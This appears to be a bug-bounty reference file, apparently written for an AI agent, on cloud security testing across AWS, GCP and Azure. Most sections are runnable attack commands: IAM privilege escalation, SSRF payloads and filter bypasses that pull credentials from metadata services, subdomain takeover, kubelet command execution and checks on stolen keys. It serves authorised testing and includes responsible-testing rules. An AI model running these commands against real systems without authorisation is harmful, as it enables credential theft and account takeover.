---
name: cloud
description: "AWS, GCP, and Azure security testing including storage misconfigurations, IAM escalation, SSRF to metadata, and multi-cloud credential exposure"
difficulty: intermediate-advanced
bounty_range: "$2,000 - $50,000+"
---
> **TYPOGRAPHY RULE: NEVER use em dashes (--) in any output. Use a hyphen (-) or rewrite the sentence. Em dashes render as â€" on HackerOne.**


# Cloud Security Testing

## AWS Security

### S3 Bucket Misconfiguration

**Discovery:**
```bash
# Common bucket naming patterns
https://{company}.s3.amazonaws.com
https://s3.amazonaws.com/{company}
https://{company}-{env}.s3.amazonaws.com
https://{company}-assets.s3.amazonaws.com
https://{company}-backup.s3.amazonaws.com
https://{company}-dev.s3.amazonaws.com
https://{company}-staging.s3.amazonaws.com
https://{company}-logs.s3.amazonaws.com
https://{company}-uploads.s3.amazonaws.com

# Environment permutations
ENV: prod, production, dev, development, staging, stage, qa, test, uat, preprod
SUFFIX: assets, backup, data, db, dumps, files, images, logs, media, static, uploads
```

**Testing access:**
```bash
# Check if bucket exists and is listable
aws s3 ls s3://target-bucket --no-sign-request

# Check specific permissions
aws s3api get-bucket-acl --bucket target-bucket --no-sign-request
aws s3api get-bucket-policy --bucket target-bucket --no-sign-request
aws s3api get-bucket-cors --bucket target-bucket --no-sign-request

# List objects
aws s3api list-objects-v2 --bucket target-bucket --no-sign-request --max-keys 100

# Test write access
aws s3 cp test.txt s3://target-bucket/test.txt --no-sign-request

# Download sensitive files
aws s3 cp s3://target-bucket/backup.sql . --no-sign-request

# Response analysis
# AccessDenied = bucket exists, private (not vuln, stop here)
# NoSuchBucket = bucket does not exist (possible subdomain takeover)
# ListBucketResult = PUBLIC LISTING (vulnerability!)
# AllUsers/AuthenticatedUsers in ACL = misconfigured
```

**Subdomain takeover via S3:**
```bash
# If CNAME points to S3 and bucket doesn't exist
dig assets.target.com CNAME
# → assets.target.com.s3.amazonaws.com

# If NoSuchBucket → create the bucket to claim it
aws s3 mb s3://assets.target.com
# Now you control content served on assets.target.com
```

**High-value file patterns:**
```
.env, .env.production, .env.backup
config.json, config.yml, settings.py
database.sql, dump.sql, backup.tar.gz
id_rsa, id_ed25519, *.pem, *.key
credentials.json, service-account.json
terraform.tfstate (contains ALL infrastructure secrets)
.git/ (full source code)
```

### IAM Privilege Escalation

**Enumerate current permissions:**
```bash
# Who am I?
aws sts get-caller-identity

# What can I do? (if IAM read access available)
aws iam list-attached-user-policies --user-name myuser
aws iam list-user-policies --user-name myuser
aws iam get-user-policy --user-name myuser --policy-name mypolicy

# Enumerate all roles
aws iam list-roles
aws iam list-role-policies --role-name target-role
```

**Common escalation paths:**
```bash
# 1. iam:CreatePolicyVersion - create new version of existing policy
aws iam create-policy-version --policy-arn arn:aws:iam::ACCOUNT:policy/target \
  --policy-document '{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Action":"*","Resource":"*"}]}' \
  --set-as-default

# 2. iam:AttachUserPolicy - attach admin policy to self
aws iam attach-user-policy --user-name myuser \
  --policy-arn arn:aws:iam::aws:policy/AdministratorAccess

# 3. iam:PassRole + lambda:CreateFunction - create Lambda with privileged role
aws lambda create-function --function-name escalate \
  --runtime python3.9 --role arn:aws:iam::ACCOUNT:role/admin-role \
  --handler index.handler --zip-file fileb://exploit.zip

# 4. iam:PassRole + ec2:RunInstances - launch EC2 with privileged role
aws ec2 run-instances --image-id ami-xxx --instance-type t2.micro \
  --iam-instance-profile Name=admin-profile

# 5. sts:AssumeRole - assume a more privileged role
aws sts assume-role --role-arn arn:aws:iam::ACCOUNT:role/admin-role \
  --role-session-name escalation

# 6. iam:CreateLoginProfile - create console password for user without one
aws iam create-login-profile --user-name target-user --password 'P@ssw0rd!'
```

**Tools:**
```bash
# Enumerate escalation paths automatically
# Pacu - AWS exploitation framework
pacu
> import_keys --all
> run iam__enum_permissions
> run iam__privesc_scan

# Cloudsplaining - IAM policy analyzer
cloudsplaining download --profile target
cloudsplaining scan --input-file account-authorization-details.json
```

### Lambda SSRF / Function Abuse

```bash
# Lambda environment variables often contain secrets
# If you can invoke or read Lambda config:
aws lambda get-function --function-name target-function
# Look for: Environment.Variables (API keys, DB passwords, etc.)

aws lambda list-functions --region us-east-1
# Enumerate all functions across all regions

# Lambda SSRF to metadata service
# If Lambda processes user-controlled URLs:
http://169.254.169.254/latest/meta-data/iam/security-credentials/
# Returns temporary IAM credentials for Lambda execution role
```

### EC2 Metadata Service (IMDS)

```bash
# IMDSv1 (no token required - easier to exploit via SSRF)
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE-NAME
# Returns: AccessKeyId, SecretAccessKey, Token

# IMDSv2 (requires token - harder but not impossible)
TOKEN=$(curl -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")
curl -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

# User data (often contains bootstrap scripts with secrets)
curl http://169.254.169.254/latest/user-data/

# SSRF bypass patterns for IMDS
http://[::ffff:169.254.169.254]/
http://169.254.169.254.nip.io/
http://0xa9fea9fe/
http://2852039166/
http://169.254.169.254:80/
http://169.254.169.254:443/
```

### SQS/SNS Exposure

```bash
# List queues (if permissions allow)
aws sqs list-queues

# Check queue policy for public access
aws sqs get-queue-attributes --queue-url https://sqs.REGION.amazonaws.com/ACCOUNT/QUEUE \
  --attribute-names Policy

# Read messages from exposed queue
aws sqs receive-message --queue-url https://sqs.REGION.amazonaws.com/ACCOUNT/QUEUE \
  --max-number-of-messages 10

# SNS topic policies
aws sns list-topics
aws sns get-topic-attributes --topic-arn arn:aws:sns:REGION:ACCOUNT:TOPIC
# Look for: "Principal": "*" in policy
```

### Cognito Misconfiguration

```bash
# If you find a Cognito User Pool ID and Client ID:
aws cognito-idp sign-up --client-id CLIENT_ID --username attacker@evil.com \
  --password 'Test@1234' --user-attributes Name=email,Value=attacker@evil.com

# Self-confirm (if admin confirmation not required)
aws cognito-idp confirm-sign-up --client-id CLIENT_ID \
  --username attacker@evil.com --confirmation-code 123456

# Cognito Identity Pool - unauthenticated access
aws cognito-identity get-id --identity-pool-id REGION:POOL-ID
aws cognito-identity get-credentials-for-identity --identity-id REGION:ID
# Returns temporary AWS credentials - check what they can access
```

## GCP Security

### GCS Bucket Misconfiguration

```bash
# GCS bucket naming patterns
https://storage.googleapis.com/{company}
https://{company}.storage.googleapis.com
gs://{company}-backup
gs://{company}-{env}

# Test public access
curl https://storage.googleapis.com/{bucket}
curl https://storage.googleapis.com/storage/v1/b/{bucket}/o
# 200 with listing = public read

# gsutil testing
gsutil ls gs://target-bucket
gsutil ls -la gs://target-bucket
gsutil cp gs://target-bucket/secret.txt .

# Check IAM policy
gsutil iam get gs://target-bucket
# Look for: allUsers, allAuthenticatedUsers
```

### Firebase Open Databases

```bash
# Firebase Realtime Database
curl https://{project-id}.firebaseio.com/.json
# If returns data without auth → OPEN DATABASE

# Firestore REST API
curl https://firestore.googleapis.com/v1/projects/{project-id}/databases/(default)/documents/{collection}
# Check for missing security rules

# Firebase Storage
curl https://firebasestorage.googleapis.com/v0/b/{project-id}.appspot.com/o
# Lists all files if storage rules allow public read

# Common discovery
# Check page source for firebaseConfig:
# apiKey, authDomain, databaseURL, projectId, storageBucket
# These are NOT secrets - they're client config
# BUT open rules on the database/storage are vulnerabilities
```

### GCP Metadata SSRF

```bash
# GCP metadata service (requires header)
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/
curl -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/

# Get service account token
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
# Returns: access_token, expires_in, token_type

# Get service account email
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/email

# Get project metadata (SSH keys, startup scripts)
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/project/attributes/

# Instance attributes (often contain secrets in startup scripts)
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/attributes/startup-script

# Kubernetes cluster credentials
curl -H "Metadata-Flavor: Google" \
  http://169.254.169.254/computeMetadata/v1/instance/attributes/kube-env

# SSRF note: must include Metadata-Flavor header
# Some SSRF vectors allow header injection via CRLF:
http://169.254.169.254/computeMetadata/v1/?%0d%0aMetadata-Flavor:%20Google
```

### Cloud Function Authentication Bypass

```bash
# Cloud Functions with allUsers invoker role
gcloud functions list --project PROJECT_ID
gcloud functions describe FUNCTION_NAME --region REGION

# Check IAM policy
gcloud functions get-iam-policy FUNCTION_NAME --region REGION
# Look for: allUsers or allAuthenticatedUsers with roles/cloudfunctions.invoker

# Test unauthenticated invocation
curl https://REGION-PROJECT.cloudfunctions.net/FUNCTION_NAME
```

## Azure Security

### Blob Storage Misconfiguration

```bash
# Azure blob URL patterns
https://{account}.blob.core.windows.net/{container}
https://{account}.blob.core.windows.net/{container}?restype=container&comp=list

# List blobs (if public)
curl "https://{account}.blob.core.windows.net/{container}?restype=container&comp=list"

# Common container names
$root, $web, assets, backups, data, files, images, logs, media, uploads

# SAS token exposure (check URLs in page source, JS files)
# Format: ?sv=2021-06-08&ss=b&srt=sco&sp=rwdlacitfx&se=...&sig=...
# If found: test the SAS token scope and permissions

# Azure Storage Explorer can be used with discovered SAS tokens
```

### App Service Debugging

```bash
# Kudu console (SCM site)
https://{app-name}.scm.azurewebsites.net/
# If accessible without auth → full server access

# Debug console
https://{app-name}.scm.azurewebsites.net/DebugConsole
# Provides file browser and command execution

# Environment variables (contain connection strings, secrets)
https://{app-name}.scm.azurewebsites.net/Env

# Web deploy endpoint
https://{app-name}.scm.azurewebsites.net/api/zip/site/wwwroot/

# Application settings via REST
https://management.azure.com/subscriptions/{sub}/resourceGroups/{rg}/providers/Microsoft.Web/sites/{app}/config/appsettings/list?api-version=2022-03-01
```

### Azure Function Authentication

```bash
# Functions without function-level auth
https://{function-app}.azurewebsites.net/api/{function-name}
# If no function key required → open function

# Check for exposed function keys in:
# - Git repositories
# - Client-side JavaScript
# - API responses
# - Azure Storage (function key storage)

# Host key exposure
https://{function-app}.azurewebsites.net/admin/host/keys
# If accessible → full admin access to all functions
```

### Azure AD / Entra ID

```bash
# Enumerate tenant info
https://login.microsoftonline.com/{domain}/.well-known/openid-configuration
https://login.microsoftonline.com/{domain}/v2.0/.well-known/openid-configuration

# Check for open user enumeration
# POST to login endpoint with valid/invalid usernames
# Different error codes reveal user existence

# App registration misconfiguration
# Overprivileged app registrations
# Multi-tenant apps accepting any Azure AD tenant
# Missing redirect URI validation
```

## Multi-Cloud & General

### Credential Exposure

**Common locations for leaked cloud credentials:**
```
SOURCE CODE:
- .env, .env.production, .env.local
- config.py, settings.py, config.json
- docker-compose.yml, docker-compose.override.yml
- terraform.tfstate, terraform.tfvars
- .aws/credentials, .boto, .s3cfg
- .gcloud/credentials.db
- .azure/accessTokens.json

CI/CD:
- .github/workflows/*.yml (secrets in env vars)
- .gitlab-ci.yml
- Jenkinsfile
- .circleci/config.yml
- .travis.yml

CLIENT-SIDE:
- JavaScript source maps
- Mobile app decompilation
- Browser localStorage/sessionStorage
- API responses
- Error messages with stack traces
```

**Credential validation:**
```bash
# AWS - verify credentials work
aws sts get-caller-identity --profile stolen

# GCP - verify service account key
gcloud auth activate-service-account --key-file=stolen-key.json
gcloud projects list

# Azure - verify credentials
az login --service-principal -u CLIENT_ID -p SECRET --tenant TENANT_ID
az account list
```

### Cloud SSRF Techniques

```bash
# AWS IMDS (see AWS section above)
http://169.254.169.254/latest/meta-data/

# GCP Metadata (requires header)
http://169.254.169.254/computeMetadata/v1/ (with Metadata-Flavor: Google header)
http://metadata.google.internal/computeMetadata/v1/

# Azure IMDS
http://169.254.169.254/metadata/instance?api-version=2021-02-01
# Requires: Metadata: true header

# DigitalOcean
http://169.254.169.254/metadata/v1/

# Alibaba Cloud
http://100.100.100.200/latest/meta-data/

# Oracle Cloud
http://169.254.169.254/opc/v2/instance/

# Kubernetes
https://kubernetes.default.svc/
# Service account token at: /var/run/secrets/kubernetes.io/serviceaccount/token

# BYPASS PATTERNS (all providers):
# IP obfuscation
http://0xa9fea9fe/              # Hex
http://2852039166/              # Decimal
http://0251.0376.0251.0376/     # Octal
http://[::ffff:169.254.169.254]/  # IPv6
http://169.254.169.254.nip.io/ # DNS rebinding
http://169.254.169.254:80/     # Explicit port
http://169.254.169.254:443/    # HTTPS port

# URL parser confusion
http://169.254.169.254#@allowed-host.com
http://allowed-host.com@169.254.169.254
http://169.254.169.254%23@allowed-host.com
```

### Subdomain Takeover (Cloud Services)

```
VULNERABLE CNAME TARGETS:
Service                  | CNAME Pattern                      | Fingerprint
-------------------------|------------------------------------|-----------------------
AWS S3                   | *.s3.amazonaws.com                 | NoSuchBucket
AWS CloudFront           | *.cloudfront.net                   | Bad request / no distro
Azure Blob               | *.blob.core.windows.net            | BlobNotFound
Azure App Service        | *.azurewebsites.net                | No website here
Azure CDN                | *.azureedge.net                    | No website here
Azure Traffic Manager    | *.trafficmanager.net               | No website here
GitHub Pages             | *.github.io                        | 404 no custom domain
Heroku                   | *.herokuapp.com                    | No such app
Shopify                  | shops.myshopify.com                | Sorry, not found
Fastly                   | *.fastly.net                       | Fastly error
Pantheon                 | *.pantheonsite.io                  | 404 not found
Surge.sh                 | *.surge.sh                         | project not found
Cargo Collective         | *.cargocollective.com              | 404
Ghost.io                 | *.ghost.io                         | Ghost default page
Zendesk                  | *.zendesk.com                      | Help Center Closed

TESTING:
1. Enumerate subdomains (subfinder, amass)
2. Check CNAME records (dig, nslookup)
3. Visit URL and check for takeover fingerprints
4. Attempt to claim the resource
```

### Kubernetes / Container Security

```bash
# Exposed Kubernetes dashboards
https://target:6443/api/v1/
https://target:8001/
https://target:10250/pods  # Kubelet API

# Unauthenticated kubelet
curl -k https://NODE_IP:10250/pods
curl -k https://NODE_IP:10250/run/NAMESPACE/POD/CONTAINER -d "cmd=id"

# etcd exposed (contains all cluster secrets)
curl http://target:2379/v2/keys/
etcdctl --endpoints=http://target:2379 get / --prefix --keys-only

# Container registry (no auth)
curl https://registry.target.com/v2/_catalog
curl https://registry.target.com/v2/IMAGE/manifests/latest
# Pull images, extract secrets from layers

# Helm chart values (often contain secrets)
helm list
helm get values RELEASE_NAME
```

## Testing Methodology

### Phase 1: Asset Discovery

```
1. Identify cloud provider(s) from:
   - DNS records (CNAME to cloud services)
   - HTTP response headers (Server, X-Amz-*, X-GUploader-UploadID)
   - SSL certificate transparency logs
   - JavaScript source code (SDK imports, config objects)
   - Mobile app decompilation

2. Enumerate cloud resources:
   - S3/GCS/Blob buckets (naming patterns + brute force)
   - Subdomains pointing to cloud services
   - API endpoints (Lambda, Cloud Functions, Azure Functions)
   - CDN distributions
```

### Phase 2: Configuration Review

```
1. Test storage bucket permissions (read, write, list, ACL)
2. Check for public snapshots, AMIs, container images
3. Test function endpoints without authentication
4. Check for exposed management interfaces (Kudu, kubelet)
5. Enumerate IAM through error messages and API responses
```

### Phase 3: Credential Hunting

```
1. Search public code repos for leaked keys
2. Check client-side JavaScript for hardcoded credentials
3. Test SSRF to metadata services
4. Look for terraform state files in S3/GCS
5. Check CI/CD pipelines for exposed secrets
```

### Phase 4: Privilege Escalation

```
1. Test discovered credentials for over-permissioning
2. Enumerate IAM policies for escalation paths
3. Test role assumption and cross-account access
4. Check for service account key exposure
```

## Evidence Requirements

```
REQUIRED EVIDENCE:
1. Screenshot of exposed resource
2. curl command and response proving access
3. Type of data exposed (PII, credentials, source code, etc.)
4. Impact assessment (number of records, sensitivity level)
5. Steps to reproduce from scratch
6. Proof that data is genuine (redacted sample)

DO NOT:
- Download or store PII/credentials beyond minimum proof
- Modify or delete any cloud resources
- Access resources beyond proving the vulnerability
- Enumerate entire databases (a few records suffice)

RESPONSIBLE TESTING:
- Read access proof is sufficient (don't write/delete)
- Redact sensitive data in reports
- Report immediately if critical data exposed
```

## Bounty Ranges

| Vulnerability | Typical Range | Notes |
|--------------|---------------|-------|
| Public S3 with PII/credentials | $5,000 - $25,000 | Higher if massive dataset |
| S3 write access | $2,000 - $10,000 | Content injection risk |
| Subdomain takeover (cloud) | $2,000 - $10,000 | Higher for auth cookie scope |
| SSRF to cloud metadata | $5,000 - $25,000 | Critical if IAM creds obtained |
| IAM privilege escalation | $5,000 - $50,000 | Depends on escalation scope |
| Firebase open database (PII) | $3,000 - $15,000 | Higher with sensitive data |
| Exposed terraform.tfstate | $5,000 - $20,000 | Contains all infrastructure secrets |
| Kubernetes unauth access | $5,000 - $30,000 | Critical: cluster admin = full compromise |
| Container registry exposed | $3,000 - $15,000 | Source code + embedded secrets |
| Cloud function auth bypass | $2,000 - $15,000 | Depends on function purpose |
| Cognito misconfiguration | $2,000 - $10,000 | Self-registration to internal resources |
| SAS token exposure | $2,000 - $10,000 | Depends on token scope |

## Real-World Examples

```
Capital One S3 Breach (2019):
- SSRF in WAF to EC2 metadata → IAM credentials → S3 access
- 100M+ credit card applications exposed
- $80M fine, criminal charges against researcher (DO NOT DO THIS)
- Lesson: SSRF + cloud metadata = critical chain

Microsoft Power Apps (2021):
- Open-by-default OData APIs exposed 38M records
- Multiple organizations' PII including COVID contact tracing
- Fixed by changing default to secure

Twitch Source Code Leak (2021):
- Misconfigured server exposed entire Git repository
- Source code, creator payouts, internal tools leaked
- Estimated impact: massive reputational damage

Toyota GitHub Exposure (2022):
- Data access key exposed in public GitHub repo for 5 years
- Customer data for 296,000 users potentially exposed
- T-Connect app credentials in source code

Uber S3 Misconfiguration (Multiple):
- Multiple instances of S3 buckets with sensitive data
- Driver PII, internal documents
- Bounty payouts: $5,000 - $10,000 per finding
```
